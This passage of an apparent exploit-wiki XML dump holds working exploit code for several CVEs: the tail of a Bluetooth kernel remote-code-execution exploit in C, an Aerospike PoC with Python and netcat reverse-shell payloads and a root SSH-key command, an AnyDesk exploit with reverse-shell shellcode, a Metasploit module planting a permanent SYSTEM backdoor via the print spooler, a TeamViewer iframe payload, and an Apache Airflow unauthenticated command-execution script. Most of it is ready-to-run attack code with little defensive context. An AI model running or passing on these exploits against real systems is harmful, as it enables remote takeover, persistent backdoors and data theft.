        htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    assoc_rsp.assoc_rsp.id = i;
    for (int j = 0; j &lt; sizeof(assoc_rsp.data); j += 8)
      memset(&amp;assoc_rsp.data[j], 'A' + j / 8, 8);
    build_payload(assoc_rsp.data);

    // Send fragmented l2cap packets (assume ACL MTU is at least 256 bytes).
    hci_send_acl_data(hci_sock, hci_handle, &amp;assoc_rsp,
                      sizeof(assoc_rsp) - sizeof(assoc_rsp.data), 2);
    hci_send_acl_data(hci_sock, hci_handle, &amp;assoc_rsp.data[0x000], 0x100, 1);
    hci_send_acl_data(hci_sock, hci_handle, &amp;assoc_rsp.data[0x100], 0x100, 1);
    hci_send_acl_data(hci_sock, hci_handle, &amp;assoc_rsp.data[0x200], 0x100, 1);
    hci_send_acl_data(hci_sock, hci_handle, &amp;assoc_rsp.data[0x300], 0x100, 1);
  }

  printf("\n");
}

static void spray_kmalloc_128(int num) {
  // Skip first two hci devices because they may be legit.
  for (int i = 2; i &lt; num + 2; i++) {
    printf("\r[*] Sending packet with id #%d...", i);
    fflush(stdout);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_info_rsp info_rsp;
    } info_rsp = {0};
    info_rsp.hdr.len = htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE);
    info_rsp.hdr.cid = htobs(AMP_MGR_CID);
    info_rsp.amp_hdr.code = A2MP_INFO_RSP;
    info_rsp.amp_hdr.ident = L2CAP_IDENT;
    info_rsp.amp_hdr.len =
        htobs(sizeof(info_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    info_rsp.info_rsp.id = i;
    hci_send_acl_data(hci_sock, hci_handle, &amp;info_rsp, sizeof(info_rsp), 2);

    struct {
      l2cap_hdr hdr;
      a2mp_hdr amp_hdr;
      a2mp_assoc_rsp assoc_rsp;
      uint8_t data[0x80];
    } assoc_rsp = {0};
    assoc_rsp.hdr.len = htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE);
    assoc_rsp.hdr.cid = htobs(AMP_MGR_CID);
    assoc_rsp.amp_hdr.code = A2MP_ASSOC_RSP;
    assoc_rsp.amp_hdr.ident = L2CAP_IDENT;
    assoc_rsp.amp_hdr.len =
        htobs(sizeof(assoc_rsp) - L2CAP_HDR_SIZE - sizeof(a2mp_hdr));
    assoc_rsp.assoc_rsp.id = i;
    for (int j = 0; j &lt; sizeof(assoc_rsp.data); j += 8)
      memset(&amp;assoc_rsp.data[j], 'A' + j / 8, 8);
    // Fake sock object.
    *(uint64_t *)&amp;assoc_rsp.data[0x10] = l2cap_chan_addr + 0x300; // sk_filter
    hci_send_acl_data(hci_sock, hci_handle, &amp;assoc_rsp, sizeof(assoc_rsp), 2);
  }

  printf("\n");
}

int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: %s target_mac source_ip source_port\n", argv[0]);
    exit(1);
  }

  bdaddr_t dst_addr = {0};
  str2ba(argv[1], &amp;dst_addr);

  snprintf(remote_command, sizeof(remote_command), REMOTE_COMMAND, argv[2],
           argv[3]);
  printf("[+] Remote command: %s\n", remote_command);

  printf("[*] Opening hci device...\n");
  hci_sock = connect_hci();

  printf("[*] Connecting to victim...\n");
  l2_sock = connect_l2cap(dst_addr, &amp;hci_handle);
  printf("[+] HCI handle: %x\n", hci_handle);

  connect_a2mp();

  uint64_t kernel_addr = leak_kstack();
  printf("[+] Kernel address: %lx\n", kernel_addr);
  KASLR_DEFEAT(kaslr_offset, kernel_addr);
  printf("[+] KASLR offset: %lx\n", kaslr_offset);
  if ((kaslr_offset &amp; 0xfffff) != 0) {
    printf("[-] Error KASLR offset is invalid.\n");
    exit(1);
  }

  prepare_l2cap_chan_addr_leak();
  l2cap_chan_addr = leak_kstack() - 0x110;
  printf("[+] l2cap_chan address: %lx\n", l2cap_chan_addr);
  if ((l2cap_chan_addr &amp; 0xff) != 0) {
    printf("[-] Error l2cap_chan address is invalid.\n");
    exit(1);
  }

  // Somehow, spraying a bit before makes the UaF more reliable.
  printf("[*] Spraying kmalloc-1024...\n");
  spray_kmalloc_1024(0x40);

  // Disconnect to free the l2cap_chan object, then reconnect.
  disconnect_a2mp();
  connect_a2mp();

  // Attempt to reclaim the freed l2cap_chan object.
  printf("[*] Spraying kmalloc-1024...\n");
  for (int i = 0; i &lt; NUM_SPRAY_KMALLOC_1024; i++) {
    spray_kmalloc_1024(0x40);
  }

  // Attempt to control the out-of-bounds read.
  printf("[*] Spraying kmalloc-128...\n");
  for (int i = 0; i &lt; NUM_SPRAY_KMALLOC_128; i++) {
    spray_kmalloc_128(0x40);
  }

  printf("[*] Triggering remote code execution...\n");
  disconnect_a2mp();
  trigger_type_confusion();

  close(l2_sock);
  hci_close_dev(hci_sock);

  return 0;
}
&lt;/pre&gt;</text>
      <sha1>3yvnwc32latjp2ll8b45jo3yydpgb9t</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-13151 Aerospike 數據庫主機命令執行漏洞</title>
    <ns>0</ns>
    <id>2390</id>
    <revision>
      <id>2878</id>
      <timestamp>2021-05-17T01:37:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== Aerospike 社區版 \&lt;5.1.0.3   ==POC== &lt;pre&gt; #!/usr/bin/env python3 import argparse import random import os, sys from time import sleep import string # requi..."</comment>
      <origin>2878</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6289" sha1="880hona5rmb2qr3gmc9a3rqjwy0z15v" xml:space="preserve">==漏洞影響==
Aerospike 社區版 \&lt;5.1.0.3


==POC==
&lt;pre&gt;
#!/usr/bin/env python3
import argparse
import random
import os, sys
from time import sleep
import string
# requires aerospike package from pip
import aerospike
# if this isn't installing, make sure os dependencies are met
# sudo apt-get install python-dev
# sudo apt-get install libssl-dev
# sudo apt-get install python-pip
# sudo apt-get install zlib1g-dev
PYTHONSHELL = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&amp;"""
NETCATSHELL = 'rm /tmp/ft;mkfifo /tmp/ft;cat /tmp/ft|/bin/sh -i 2&gt;&amp;1|nc {ip} {port} &gt;/tmp/ft&amp;'
def _get_client(cfg):
    try:
        return aerospike.client({
            'hosts': [(cfg.ahost, cfg.aport)],
             'policies': {'timeout': 8000}}).connect()
    except Exception as e:
        print(f"unable to access cluster @ {cfg.ahost}:{cfg.aport}\n{e.msg}")
def _send(client, cfg, _cmd):
    try:
        print(client.apply((cfg.namespace, cfg.setname, cfg.dummystring ), 'poc', 'runCMD', [_cmd]))
    except Exception as e:
        print(f"[-] UDF execution returned {e.msg}")
def _register_udf(client, cfg):
    try:
        client.udf_put(cfg.udfpath)
    except Exception as e:
        print(f"[-] whoops, couldn't register the udf {cfg.udfpath}")
        raise e
def _random_string(l):
    return ''.join([random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(l)])
def _populate_table(client, cfg):
    ns = cfg.namespace
    setname = cfg.setname
    print(f"[+] writing to {ns}.{setname}")
    try:
        rec = cfg.dummystring
        client.put((ns, setname, rec), {'pk':cfg.dummystring})
        print(f"[+] wrote {rec}")
    except Exception as e:
        print(f"[-] unable to write record: {e.msg}")
        try:
            if e.msg.startswith('Invalid namespace'):
                print("Valid namespaces: ")
                for n in _info_parse("namespaces", client).split(";"):
                    print(n.strip())
        except:
            pass
        sys.exit(13)
def _info_parse(k, client):
    try: 
        return [i[1] for i in client.info_all(k).values() ][0]
    except Exception as e:
        print(f"error retrieving information: {e.msg}")
        return []
def _is_vuln(_mj, _mi, _pt, _bd):
    fixed = [5,1,0,3]
    found = [_mj, _mi, _pt, _bd]
    if fixed == found:
        return False
    for ix, val in enumerate(found):
        if val &lt; fixed[ix]:
            return True
        elif val == fixed[ix]:
            pass
        else:
            return False
def _version_check(client):
    print("[+] aerospike build info: ", end="")
    try:
        _ver = _info_parse("build", client)
        print(_ver)
        mj, mi, pt, bd = [int(i) for i in _ver.split('.')]
        if _is_vuln(mj, mi, pt, bd):
            print("[+] looks vulnerable")
            return
        else:
            print(f"[-] this instance is patched.")
            sys.exit(0)
    except Exception as e:
        print(f"[+] unable to interpret build number due to {e}")
        print("[+] continuing anyway... ")
def _exploit(cfg):
    client = _get_client(cfg)
    if not client:
        return
    _version_check(client)
    print(f"[+] populating dummy table.")
    _populate_table(client, cfg)
    print(f"[+] registering udf")
    _register_udf(client, cfg)
    if cfg.pythonshell or cfg.netcatshell:
        sys.stdout.flush()
        print(f"[+] sending payload, make sure you have a listener on {cfg.lhost}:{cfg.lport}", end="")
        sys.stdout.flush()
        for i in range(4): 
            print(".", end="")
            sys.stdout.flush()
            sleep(1)
        print(".")
        _send(client, cfg, PYTHONSHELL.format(ip=cfg.lhost,port=cfg.lport) if cfg.pythonshell else NETCATSHELL.format(ip=cfg.lhost,port=cfg.lport) )
    if cfg.cmd:
        print(f"[+] issuing command \"{cfg.cmd}\"")
        _send(client, cfg, cfg.cmd)
if __name__ == '__main__':
    if len(sys.argv) == 1:
        print(f"[+] usage examples:\n{sys.argv[0]} --ahost 10.11.12.13 --pythonshell --lhost=10.0.0.1 --lport=8000")
        print("... or ... ")
        print(f"{sys.argv[0]} --ahost 10.11.12.13 --cmd 'echo MYPUBKEY &gt; /root/.ssh/authorized_keys'")
        sys.exit(0)
    parser = argparse.ArgumentParser(description='Aerospike UDF Command Execution - CVE-2020-13151 - POC')
    parser.add_argument("--ahost", help="Aerospike host, default 127.0.0.1", default="127.0.0.1")
    parser.add_argument("--aport", help="Aerospike port, default 3000", default=3000, type=int)
    parser.add_argument("--namespace", help="Namespace in which to create the record set", default="test")
    parser.add_argument("--setname", help="Name of set to populate with dummy record(s), default is cve202013151", default=None)
    parser.add_argument('--dummystring', help="leave blank for a random value, can use a previously written key to target a specific cluster node", default=None)
    parser.add_argument("--pythonshell", help="attempt to use a python reverse shell (requires lhost and lport)", action="store_true")
    parser.add_argument("--netcatshell", help="attempt to use a netcat reverse shell (requires lhost and lport)", action="store_true")
    parser.add_argument("--lhost", help="host to use for reverse shell callback")
    parser.add_argument("--lport", help="port to use for reverse shell callback")
    parser.add_argument("--cmd", help="custom command to issue against the underlying host")
    parser.add_argument('--udfpath', help="where is the udf to distribute? defaults to `pwd`/poc.lua", default=None)
    cfg = parser.parse_args()
    if not cfg.setname:
        cfg.setname = 'cve202013151'
    if not cfg.dummystring:
        cfg.dummystring = _random_string(16)
    if not cfg.udfpath:
        cfg.udfpath = os.path.join(os.getcwd(), 'poc.lua')
    assert cfg.cmd or (cfg.lhost and cfg.lport and (cfg.pythonshell or cfg.netcatshell)), "Must specify a command, or a reverse shell + lhost + lport"
    if cfg.pythonshell or cfg.netcatshell:
        assert cfg.lhost and cfg.lport, "Must specify lhost and lport if using a reverse shell"
    _exploit(cfg)
&lt;/pre&gt;</text>
      <sha1>880hona5rmb2qr3gmc9a3rqjwy0z15v</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-13160 AnyDesk 5.5.2遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>221</id>
    <revision>
      <id>336</id>
      <timestamp>2021-03-12T07:59:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: AnyDesk 5.5.2 - Remote Code Execution # Date: 09/06/20 # Exploit Author: scryh # Vendor Homepage: https://anydesk.com/en # Version: 5.5.2 # Test..."</comment>
      <origin>336</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1848" sha1="lt38fejiqkjiypdajop8fexvjfd3pld" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '192.168.x.x'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('&gt;I', ad_id)
  d += struct.pack('&gt;I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('&gt;I', len(hn)) + hn
  d += struct.pack('&gt;I', len(user)) + user
  d += struct.pack('&gt;I', 0)
  d += struct.pack('&gt;I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('&gt;I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa1\x6f\x18\xf5\x87"
shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"
shellcode += b"\x8a\x87\xb4\xba\x91\xe1\x1e\x4f\x69\x87\xa7"
shellcode += b"\xbe\xb3\x34\x88\x2a\x4d\xb5\xab\xe5\x8e\x3d"
shellcode += b"\x2c\x7b\x34\x74\xec\x5b\xd4\xa9\x2f\x2e\x43"
shellcode += b"\x9e\xcc\xe0\xa8\x83\xcf\xa7\x3e\xba\xec\x69"
shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
&lt;/pre&gt;</text>
      <sha1>lt38fejiqkjiypdajop8fexvjfd3pld</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-1337 Microsoft Spooler 本地權限提升漏洞</title>
    <ns>0</ns>
    <id>3231</id>
    <revision>
      <id>3769</id>
      <timestamp>2021-05-31T04:07:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== This exploit leverages a file write vulnerability in the print spooler service which will restart if stopped. Because the service cannot be stopped long enough to rem..."</comment>
      <origin>3769</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7027" sha1="qycrf9pqm8qljlbcxqml7sunwt0sudm" xml:space="preserve">==INFO==
This exploit leverages a file write vulnerability in the print spooler service which will restart if stopped. Because the service cannot be stopped long enough to remove the dll, there is no way to remove the dll once it is loaded by the service. Essentially, on default settings, this module adds a permanent elevated backdoor.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/powershell'

class MetasploitModule &lt; Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Powershell

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Microsoft Spooler Local Privilege Elevation Vulnerability',
        'Description' =&gt; %q{
          This exploit leverages a file write vulnerability in the print spooler service
          which will restart if stopped.  Because the service cannot be stopped long
          enough to remove the dll, there is no way to remove the dll once
          it is loaded by the service.  Essentially, on default settings, this module
          adds a permanent elevated backdoor.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'Peleg Hadar', # Original discovery
            'Tomer Bar', # Original discovery
            '404death', # PoC
            'sailay1996', # PoC
            'bwatters-r7' # msf module
          ],
        'Platform' =&gt; ['win'],
        'SessionTypes' =&gt; ['meterpreter'],
        'Targets' =&gt;
          [
            [ 'Automatic', { 'Arch' =&gt; [ ARCH_X86, ARCH_X64 ] } ]
          ],
        'DefaultTarget' =&gt; 0,
        'DisclosureDate' =&gt; '2019-11-04',
        'References' =&gt;
          [
            ['CVE', '2020-1337'],
            ['URL', 'https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1337'],
            ['URL', 'https://github.com/sailay1996/cve-2020-1337-poc'],
            ['URL', 'https://voidsec.com/cve-2020-1337-printdemon-is-dead-long-live-printdemon/']
          ],
        'DefaultOptions' =&gt;
          {
            'DisablePayloadHandler' =&gt; true
          },
        'SideEffects' =&gt; [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]
      )
    )

    register_options([
      OptString.new('JUNCTION_PATH',
                    [false, 'Path to use as junction (%TEMP%/%RAND% by default).', nil]),
      OptString.new('DESTINATION_PATH',
                    [false, 'Location of file to overwrite (%WINDIR%\system32\ by default).', nil]),
      OptString.new('DESTINATION_FILE',
                    [false, 'Filename to overwrite (ualapi.dll by default).', nil]),
      OptString.new('PRINTER_NAME',
                    [true, 'Printer Name to use (%RAND% by default).', Rex::Text.rand_text_alpha(5..9).to_s]),
      OptBool.new('RESTART_TARGET',
                  [false, 'Restart the target after exploit (you will lose your session until a second reboot).', false])
    ])
  end

  def cve_2020_1337_privileged_filecopy(destination_file, destination_path, junction_path, printer_name, b64_payload)
    # Read in Generic Script
    script = exploit_data('CVE-2020-1337', 'cve-2020-1337.ps1')
    fail_with(Failure::BadConfig, 'No exploit script found') if script.nil?

    # Replace Values in Generic Script
    vprint_status('Replacing variables')
    junction_filepath = "#{junction_path}\\#{destination_file}"
    # The random string appears to be required when using the psh_exec
    # It may be due to the way we break apart the script?
    # I would not be upset to find the root cause and fix it.
    script.gsub!('JUNCTION_FILEPATH', junction_filepath)
    script.gsub!('PRINTER_NAME', printer_name)
    script.gsub!('JUNCTION_PATH', junction_path)
    script.gsub!('DESTINATION_PATH', destination_path)
    script.gsub!('B64_PAYLOAD_DLL', b64_payload)

    # Run Exploit Script
    print_status("Running Exploit on #{sysinfo['Computer']}")
    begin
      #client.powershell.execute_string(code: script)
      session.powershell.execute_string({code: script})
    rescue Rex::TimeoutError =&gt; e
      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)
      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')
    end
  end

  def exploit
    if datastore['DESTINATION_PATH'].nil? || datastore['DESTINATION_PATH'].empty?
      win_dir = session.sys.config.getenv('windir')
      destination_path = "#{win_dir}\\system32"
    else
      destination_path = datastore['DESTINATION_PATH']
    end
    if datastore['DESTINATION_FILE'].nil? || datastore['DESTINATION_FILE'].empty?
      destination_file = 'ualapi.dll'
    else
      destination_file = datastore['DESTINATION_FILE']
    end
    if datastore['JUNCTION_PATH'].nil? || datastore['JUNCTION_PATH'].empty?
      junction_path = "#{session.sys.config.getenv('TEMP')}\\#{Rex::Text.rand_text_alpha(6..15)}"
    else
      junction_path = datastore['JUNCTION_PATH']
    end
    client.core.use("powershell") if not client.ext.aliases.include?("powershell")
    printer_name = datastore['PRINTER_NAME']
    payload_dll = generate_payload_dll

    # Check target
    vprint_status('Checking Target')
    validate_active_host
    validate_payload

    # Run the exploit
    output = cve_2020_1337_privileged_filecopy(destination_file, destination_path, junction_path, printer_name, Rex::Text.encode_base64(payload_dll))
    sleep(3) # make sure exploit is finished

    # Reboot, if desired
    if datastore['RESTART_TARGET']
      sleep(10)
      vprint_status("Rebooting #{sysinfo['Computer']}")
      begin
        session.sys.power.reboot
      rescue Rex::TimeoutError =&gt; e
        elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)
        print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')
      end
    end
  end

  def validate_active_host
    begin
      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
      elog('Could not connect to session', error: e)
      raise Msf::Exploit::Failed, 'Could not connect to session'
    end
  end

  def validate_payload
    vprint_status("Target Arch = #{sysinfo['Architecture']}")
    vprint_status("Payload Arch = #{payload.arch.first}")
    unless payload.arch.first == sysinfo['Architecture']
      fail_with(Failure::BadConfig, 'Payload arch must match target arch')
    end
  end

  def check
    sysinfo_value = sysinfo['OS']
    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Build Number = #{build_num}")
    return Exploit::CheckCode::Appears if sysinfo_value =~ /10/ &amp;&amp; build_num &lt;= 18363
    return Exploit::CheckCode::Safe
  end
end
&lt;/pre&gt;</text>
      <sha1>qycrf9pqm8qljlbcxqml7sunwt0sudm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-13699 TeamViewer 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1157</id>
    <revision>
      <id>1446</id>
      <timestamp>2021-04-10T05:12:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; TeamViewer &lt; 8.0.258861 TeamViewer &lt; 9.0.28860 TeamViewer &lt; 10.0.258873 TeamViewer &lt; 11.0.258870 TeamViewer &lt; 12..."</comment>
      <origin>1446</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="351" sha1="set3aa9n41ap2h3e8dtson6n1yr6qfx" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
TeamViewer &lt; 8.0.258861 TeamViewer &lt; 9.0.28860 TeamViewer &lt; 10.0.258873 TeamViewer &lt; 11.0.258870 TeamViewer &lt; 12.0.258869 TeamViewer &lt; 13.2.36220 TeamViewer &lt; 14.2.56676 TeamViewer &lt; 15.8.3
&lt;/pre&gt;


==EXP==
&lt;pre&gt;
（iframe src='teamviewer10: --play \\attacker-IP\share\fake.tvs'）
&lt;/pre&gt;</text>
      <sha1>set3aa9n41ap2h3e8dtson6n1yr6qfx</sha1>
    </revision>
    <revision>
      <id>1447</id>
      <parentid>1446</parentid>
      <timestamp>2021-04-10T05:12:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1447</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="362" sha1="t9kw8nd89gavvv4se76yjruxldambi4" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
TeamViewer &lt; 8.0.258861 TeamViewer &lt; 9.0.28860 TeamViewer &lt; 10.0.258873 TeamViewer &lt; 11.0.258870 TeamViewer &lt; 12.0.258869 TeamViewer &lt; 13.2.36220 TeamViewer &lt; 14.2.56676 TeamViewer &lt; 15.8.3
&lt;/pre&gt;


==EXP==
&lt;pre&gt;
（iframe src='teamviewer10: --play \\attacker-IP\share\fake.tvs'）
&lt;/pre&gt;</text>
      <sha1>t9kw8nd89gavvv4se76yjruxldambi4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-13699 TeamViewer 遠程代碼執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3087</id>
    <revision>
      <id>3587</id>
      <timestamp>2021-05-26T18:08:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本=="</comment>
      <origin>3587</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="326" sha1="g505ylkuk3exi1og9wyke18tbcm1pva" xml:space="preserve">&lt;languages  /&gt;
==影響版本==
&lt;pre&gt;
TeamViewer &lt; 8.0.258861 TeamViewer &lt; 9.0.28860 TeamViewer &lt; 10.0.258873 TeamViewer &lt; 11.0.258870 TeamViewer &lt; 12.0.258869 TeamViewer &lt; 13.2.36220 TeamViewer &lt; 14.2.56676 TeamViewer &lt; 15.8.3
&lt;/pre&gt;


==EXP==
&lt;pre&gt;
（iframe src='teamviewer10: --play \\attacker-IP\share\fake.tvs'）
&lt;/pre&gt;</text>
      <sha1>g505ylkuk3exi1og9wyke18tbcm1pva</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-13927 CVE-2020-11978 Apache Airflow 1.10.10 - 'Example Dag'遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3333</id>
    <revision>
      <id>3891</id>
      <timestamp>2021-06-03T00:38:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Apache Airflow 1.10.10 - 'Example Dag' Remote Code Execution  # Date: 2021-06-02 # Exploit Author: Pepe Berba # Vendor Homepage: https://airflow..."</comment>
      <origin>3891</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4305" sha1="53aitm0irz31vsycjt1aswd8a8yfdmt" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Apache Airflow 1.10.10 - 'Example Dag' Remote Code Execution 
# Date: 2021-06-02
# Exploit Author: Pepe Berba
# Vendor Homepage: https://airflow.apache.org/
# Software Link: https://airflow.apache.org/docs/apache-airflow/stable/installation.html
# Version: &lt;= 1.10.10
# Tested on: Docker apache/airflow:1.10 .10 (https://github.com/pberba/CVE-2020-11978/blob/main/docker-compose.yml)
# CVE : CVE-2020-11978
# 
# This is a proof of concept for CVE-2020-11978, a RCE vulnerability in one of the example DAGs shipped with airflow
# This combines with CVE-2020-13927 where unauthenticated requests to Airflow's Experimental API were allowded by default.
# Together, potentially allows unauthenticated RCE to Airflow 
# 
# Repo: https://github.com/pberba/CVE-2020-11978
# More information can be found here:  
# https://lists.apache.org/thread.html/r23a81b247aa346ff193670be565b2b8ea4b17ddbc7a35fc099c1aadd%40%3Cdev.airflow.apache.org%3E
# https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E
#
# Remediation:
# For CVE-2020-13927 make sure that the config `[api]auth_backend = airflow.api.auth.backend.deny_all` or has auth set.
# For CVE-2020-11978 use 1.10.11 or set `load_examples=False` when initializing Airflow. You can also manually delete example_trigger_target_dag DAG.
#
# Example usage: python CVE-2020-11978.py http://127.0.0.1:8080 "touch test"

import argparse
import requests
import sys
import time

def create_dag(url, cmd):
	print('[+] Checking if Airflow Experimental REST API is accessible...')
	check = requests.get('{}/api/experimental/test'.format(url))

	if check.status_code == 200:
		print('[+] /api/experimental/test returned 200' )
	else:
		print('[!] /api/experimental/test returned {}'.format(check.status_code))
		print('[!] Airflow Experimental REST API not be accessible')
		sys.exit(1)

	check_task = requests.get('{}/api/experimental/dags/example_trigger_target_dag/tasks/bash_task'.format(url))
	if check_task.status_code != 200:
		print('[!] Failed to find the example_trigger_target_dag.bash_task')
		print('[!] Host isn\'t vunerable to CVE-2020-11978')
		sys.exit(1)
	elif 'dag_run' in check_task.json()['env']:
		print('[!] example_trigger_target_dag.bash_task is patched')
		print('[!] Host isn\'t vunerable to CVE-2020-11978')
		sys.exit(1)
	print('[+] example_trigger_target_dag.bash_task is vulnerable')

	unpause = requests.get('{}/api/experimental/dags/example_trigger_target_dag/paused/false'.format(url))
	if unpause.status_code != 200:
		print('[!] Unable to enable example_trigger_target_dag. Example dags were not loaded')
		sys.exit(1)
	else:
		print('[+] example_trigger_target_dag was enabled')

	print('[+] Creating new DAG...')
	res = requests.post(
	    '{}/api/experimental/dags/example_trigger_target_dag/dag_runs'.format(url),
	    json={
	        'conf': {
	                'message': '"; {} #'.format(cmd)
	        }
	    }
	)

	if res.status_code == 200:
		print('[+] Successfully created DAG')
		print('[+] "{}"'.format(res.json()['message']))
	else:
		print('[!] Failed to create DAG')
		sys.exit(1)

	wait_url = '{url}/api/experimental/dags/example_trigger_target_dag/dag_runs/{execution_date}/tasks/bash_task'.format(
		url = url,
		execution_date=res.json()['execution_date']
	)

	start_time = time.time()
	print('[.] Waiting for the scheduler to run the DAG... This might take a minute.')
	print('[.] If the bash task is never queued, then the scheduler might not be running.')
	while True:
		time.sleep(10)
		res = requests.get(wait_url)
		status = res.json()['state']
		if status == 'queued':
			print('[.] Bash task queued...')
		elif status == 'running':
			print('[+] Bash task running...')
		elif status == 'success':
			print('[+] Bash task successfully ran')
			break
		elif status == 'None':
			print('[-] Bash task is not yet queued...'.format(status))
		else:
			print('[!] Bash task was {}'.format(status))
			sys.exit(1)

	return 0


def main():
	arg_parser = argparse.ArgumentParser()
	arg_parser.add_argument('url', type=str, help="Base URL for Airflow")
	arg_parser.add_argument('command', type=str)
	args = arg_parser.parse_args()

	create_dag(
		args.url, 
		args.command
	)

if __name__ == '__main__':
	main()
&lt;/pre&gt;</text>
      <sha1>53aitm0irz31vsycjt1aswd8a8yfdmt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-14060 FasterXML jackson-databind 反序列化漏洞</title>
    <ns>0</ns>
    <id>4545</id>
    <revision>
      <id>5231</id>
      <timestamp>2021-06-17T01:03:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
